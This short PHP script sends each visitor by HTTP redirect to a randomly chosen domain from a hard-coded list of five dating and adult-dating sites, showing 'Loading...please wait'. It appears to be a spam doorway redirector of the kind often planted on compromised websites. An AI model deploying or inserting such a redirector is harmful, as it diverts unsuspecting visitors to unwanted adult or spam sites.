<?php
$urls = array("allonlinedating.net",
              "xxxdatingservice.net",
              "freesingleshookup.com",
              "maindatingwebsite.com",
              "thesiteforsingles.com");
$url = $urls[array_rand($urls)];
header("Location: http://$url");
echo "Loading...please wait";
?>

